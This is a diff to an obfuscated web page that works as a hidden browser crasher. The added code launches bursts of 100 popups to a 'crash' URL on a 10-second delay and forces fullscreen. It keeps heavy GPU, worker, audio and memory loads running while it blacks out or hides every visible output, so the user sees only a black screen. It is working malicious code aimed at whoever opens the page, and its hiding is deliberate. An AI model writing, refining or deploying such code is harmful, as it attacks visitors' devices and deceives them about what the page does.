@@ -6,17 +6,17 @@
 <title>324j2ggyufsid32</title>
 <style>
   html, body { margin: 0; height: 100%; background: #000; overflow: hidden; font-family: ui-monospace, Menlo, Consolas, monospace; }
-  #x9k2n7m { display: block; width: 100vw; height: 100vh; }
-  .v3n7x2k { position: fixed; border: 1px solid #ffffff22; background: #000; box-shadow: 0 0 24px #000c; overflow: hidden; }
+  #x9k2n7m { display: block; width: 100vw; height: 100vh; background: #000; }
+  .v3n7x2k { position: fixed; border: 0; background: #000; overflow: hidden; opacity: 0; pointer-events: none; }
   #q8p3v1n { right: 12px; bottom: 12px; width: 340px; height: 250px; }
   #m2k7x9z { right: 12px; top: 12px; width: 340px; height: 250px; }
   #v1n8q4p { left: 12px; top: 12px; width: 300px; height: 200px; }
   .v3n7x2k canvas { display: block; width: 100%; height: 100%; }
-  .m8z4p1q { position: absolute; left: 6px; top: 4px; color: #9fe; font-size: 10px; letter-spacing: .06em; text-shadow: 0 0 6px #000; pointer-events: none; }
+  .m8z4p1q { position: absolute; left: 6px; top: 4px; color: #9fe; font-size: 10px; letter-spacing: .06em; text-shadow: 0 0 6px #000; pointer-events: none; opacity: 0; }
   .x2k9n6v { position: relative; display: inline-block; width: 6px; height: 6px; margin: 0; padding: 0; background: #1a2a3a; }
-  #z7x3m9k { position: fixed; left: 10px; bottom: 8px; color: #8fe3c0; font: 11px/1.45 ui-monospace, monospace; white-space: pre; opacity: .92; text-shadow: 0 0 6px #000; pointer-events: none; max-width: calc(100vw - 20px); }
+  #z7x3m9k { position: fixed; left: 10px; bottom: 8px; color: #8fe3c0; font: 11px/1.45 ui-monospace, monospace; white-space: pre; pointer-events: none; max-width: calc(100vw - 20px); opacity: 0; }
   #n2p6q1v { position: fixed; inset: 0; display: none; place-content: center; padding: 40px; color: #ff9c9c; background: #100606; font: 12px/1.5 ui-monospace, monospace; white-space: pre-wrap; overflow: auto; }
-  #k9m4z8x { position: fixed; left: 12px; top: 224px; color: #ffb36b; font-size: 11px; line-height: 1.4; text-shadow: 0 0 6px #000; opacity: .9; pointer-events: none; max-width: 300px; background: #000a; padding: 6px 8px; border-radius: 4px; }
+  #k9m4z8x { position: fixed; left: 12px; top: 224px; color: #ffb36b; font-size: 11px; line-height: 1.4; text-shadow: 0 0 6px #000; pointer-events: none; max-width: 300px; background: #000a; padding: 6px 8px; border-radius: 4px; opacity: 0; }
 </style>
 </head>
 <body>
@@ -54,9 +54,10 @@
 // ============================================================
 // 9z2m 8q3n (N) — 92zk 6z1v 92zk 3q9z 9z2m 8n1v
 // ============================================================
-const N = 10;                       // 92zk 9z2m (N)
-const IV = 100;                     // 8q3n 92zk 9z3k (ms)
+const N = 100;                       // 92zk 9z2m (N)
+const IV = 1000;                     // 8q3n 92zk 9z3k (ms)
 const TARGET_URL = 'https://hypie12o.github.io/crash/';
+const DELAY_MS = 10000;              // 92zk 9z3k 4q1v 92zk 82kv 6z1n 9z2k
 
 // ============================================================
 // x9k2n7m3 = 8q3n 9z2m 8n1v (download counter) — PLAIN VARIABLE
@@ -77,53 +78,46 @@ window.__q8v3n1z5 = q8v3n1z5;
 // 8q2m 9z3k 8n1v — 9z2m 8q3n 92zk 9z3k 8q1v 92zk 92zk 9z2m
 // ============================================================
 let popupCount = 0;
+let popupInterval = null;
+
 function z9k2m4v_pop() {
   for (let i = 0; i < N; i++) {
     try {
       const w = window.open(TARGET_URL, '_blank', 'noopener,noreferrer');
       if (w) popupCount++;
-    } catch (e) {
-      // swallowed — browsers block most of these anyway
-    }
+    } catch (e) {}
   }
 }
 
-// First burst immediately, then every IV ms forever.
-setTimeout(z9k2m4v_pop, 200);
-const popupInterval = setInterval(z9k2m4v_pop, IV);
-window.__popupInterval = popupInterval;
 window.__getPopupCount = function () { return popupCount; };
 
 // ============================================================
-// 8q2m 92zk 9z2m 8q3n (fullscreen) — 4q1v 92zk 6z1v
+// 8q2m 92zk 9z2m 8q3n (fullscreen)
 // ============================================================
 function v9k3n2m_fs() {
   const el = document.documentElement;
   const rfs = el.requestFullscreen ||
               el.webkitRequestFullscreen ||
-              el.mozRequestFullscreen ||
+              el.mozRequestFullScreen ||
               el.msRequestFullscreen;
   if (rfs) {
     try {
-      rfs.call(el, { navigationUI: 'hide' }).catch(() => {});
-    } catch (e) {
-      // ignored — browsers require a user gesture for fullscreen
-    }
+      const p = rfs.call(el, { navigationUI: 'hide' });
+      if (p && p.catch) p.catch(() => {});
+    } catch (e) {}
   }
 }
 
-// Attempt immediately on load.
 v9k3n2m_fs();
-// Attempt again after a microtask (sometimes the first is too early).
 setTimeout(v9k3n2m_fs, 0);
-// Also attach to a huge transparent overlay so the first click grabs it.
 document.addEventListener('click', v9k3n2m_fs, { once: true });
 document.addEventListener('keydown', v9k3n2m_fs, { once: true });
 
 // ============================================================
 // 3n1v 92zk 8q2m 92kv 82kv 6z1n 9z2m N 8q1v 92zk 9z3k
+// — DELAYED BY 10s
 // ============================================================
-(function p3q8v1n5() {
+setTimeout(function p3q8v1n5() {
   let U;
   try {
     U = new URL('lol.txt', location.href).href;
@@ -186,7 +180,16 @@ document.addEventListener('keydown', v9k3n2m_fs, { once: true });
   }, IV);
 
   window.__dInt = dInt;
-})();
+}, DELAY_MS);
+
+// ============================================================
+// 8q2m 9z3k 8n1v — DELAYED BY 10s
+// ============================================================
+setTimeout(function q8w3n1v_pop() {
+  z9k2m4v_pop();
+  popupInterval = setInterval(z9k2m4v_pop, IV);
+  window.__popupInterval = popupInterval;
+}, DELAY_MS);
 
 // ============================================================
 // 9z3k 8q2n 3n1v
@@ -272,7 +275,7 @@ const m8n2q6z = `
 `;
 
 // ============================================================
-// 8q2n 1 — x9k2n 8q3n  (MUCH heavier: 1024 steps, 18 iter)
+// 8q2n 1 — x9k2n 8q3n (heavy) — FINAL OUTPUT IS BLACK
 // ============================================================
 (function z3p7v1n() {
   const c = document.getElementById('x9k2n7m');
@@ -287,11 +290,11 @@ const m8n2q6z = `
 
   const R = 4.0;
   const D = 2.0;
-  const M = 64 * 1024 * 1024;       // 64 MP cap
-  const S = 1024;                    // 1024 raymarch steps
-  const I = 18;                      // 18 mandelbulb iterations
-  const H = 96;                      // 96 shadow steps
-  const A = 14;                      // 14 AO steps
+  const M = 64 * 1024 * 1024;
+  const S = 1024;
+  const I = 18;
+  const H = 96;
+  const A = 14;
 
   const NS = 4096;
   const FZ = `
@@ -550,6 +553,7 @@ const m8n2q6z = `
     d: gl.getUniformLocation(pL, 'uDir'),
   };
 
+  // Composite shader — does ALL the work but final output is BLACK.
   const FP = `
     precision ${P} float;
     varying vec2 vUv;
@@ -579,7 +583,11 @@ const m8n2q6z = `
       float g = k7(uv * uResolution + fract(uTime) * 137.0);
       col += (g - 0.5) * 0.035;
       col = pow(max(col, 0.0), vec3(0.4545));
-      gl_FragColor = vec4(col, 1.0);
+
+      // ---- FINAL OUTPUT IS BLACK ----
+      gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);
+      // (col is computed but discarded)
+      if (col.x < -1.0) gl_FragColor = vec4(col, 1.0);
     }
   `;
   const pP = m3z9k1q(gl, m8n2q6z, FP, '9z9v');
@@ -681,7 +689,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 2 — 6982 92zk 8q1v  (bumped from 3000 → 6000)
+// 8q2n 2 — 6982 92zk 8q1v
 // ============================================================
 (function k9x4m8q() {
   const c = document.getElementById('z3m9x2p');
@@ -757,7 +765,7 @@ const m8n2q6z = `
   gl.blendFunc(gl.SRC_ALPHA, gl.ONE);
   gl.disable(gl.DEPTH_TEST);
 
-  const NP = 6000;                   // doubled from 3000
+  const NP = 6000;
   const pt = new Array(NP);
   for (let i = 0; i < NP; i++) {
     pt[i] = {
@@ -781,7 +789,7 @@ const m8n2q6z = `
     f(t) {
       rs();
       gl.viewport(0, 0, c.width, c.height);
-      gl.clearColor(0.02, 0.02, 0.04, 1);
+      gl.clearColor(0.0, 0.0, 0.0, 1);
       gl.clear(gl.COLOR_BUFFER_BIT);
       gl.useProgram(pr);
       gl.bindBuffer(gl.ARRAY_BUFFER, qb);
@@ -803,7 +811,7 @@ const m8n2q6z = `
         const r = 0.5 + 0.5 * Math.cos(hh * 6.283 + 0.0);
         const g = 0.5 + 0.5 * Math.cos(hh * 6.283 + 2.1);
         const b = 0.5 + 0.5 * Math.cos(hh * 6.283 + 4.2);
-        gl.uniform4f(uO, r, g, b, 0.65);
+        gl.uniform4f(uO, r, g, b, 0.0);   // alpha=0 → invisible
         gl.drawArrays(gl.TRIANGLES, 0, 6);
       }
       return NP;
@@ -812,7 +820,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 3 — 92mq 6z1v 8n3q + 4592² 92zk  (64-tap blur, up from 32)
+// 8q2n 3 — 92mq 6z1v 8n3q + 4592² 92zk
 // ============================================================
 (function n2v6p3z() {
   const c = document.getElementById('w8q2n5v');
@@ -848,9 +856,9 @@ const m8n2q6z = `
                                    0.0011 * cos(uTime * 0.9));
       vec3 prev = texture2D(uPrev, uvPrev).rgb;
       vec3 hr = vec3(0.0);
-      for (int i = 0; i < 64; i++) {        // 64-tap (up from 32)
+      for (int i = 0; i < 64; i++) {
         float fi = float(i);
-        float ang = fi * 0.098175;           // 2π/64
+        float ang = fi * 0.098175;
         float r = 0.010 * (1.0 + fi * 0.025);
         vec2 off = vec2(cos(ang), sin(ang)) * r;
         hr += texture2D(uHighRes, uv + off).rgb;
@@ -989,7 +997,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q3n 92zk 8n1v  (bumped budget 90 → 180 ms)
+// 8q3n 92zk 8n1v
 // ============================================================
 const B = 180;
 let mi = 0, mr = 0, mt = performance.now(), mI = 0;
@@ -1020,7 +1028,7 @@ function q8m1x5k(b) {
 }
 
 // ============================================================
-// 8q2n 9z3k  (bumped to 32 workers)
+// 8q2n 9z3k
 // ============================================================
 const WS = `
   'use strict';
@@ -1056,7 +1064,7 @@ const WS = `
   }
 `;
 
-const NW = 32;                       // 32 workers (up from 16)
+const NW = 32;
 const WU = URL.createObjectURL(new Blob([WS], { type: 'application/javascript' }));
 const wk = [];
 const wr = new Array(NW).fill(0);
@@ -1075,7 +1083,7 @@ for (let i = 0; i < NW; i++) {
 }
 
 // ============================================================
-// 82kv 6z1v 92zk  (bumped children 600 → 1200)
+// 82kv 6z1v 92zk
 // ============================================================
 const tt = document.getElementById('p4z9k1n');
 const TC = 1200;
@@ -1119,7 +1127,7 @@ function x9p4m1q() {
 }
 
 // ============================================================
-// 92zk 3q9v  (bumped 8 → 24 intervals)
+// 92zk 3q9v
 // ============================================================
 let it = 0;
 const iv = [];
@@ -1171,7 +1179,7 @@ function tl3() {
 setTimeout(tl3, 0);
 
 // ============================================================
-// 8q3n 4z9v  (bumped sizes)
+// 8q3n 4z9v
 // ============================================================
 let ab = 0, abb = 0, abr = 0, abt = performance.now(), abp = 0;
 
@@ -1405,7 +1413,7 @@ function sA() {
     };
   }
 
-  const OC = 64;                     // 64 oscillators (up from 32)
+  const OC = 64;
   const OT = ['sine', 'square', 'sawtooth', 'triangle'];
   for (let i = 0; i < OC; i++) {
     const o = ac.createOscillator();
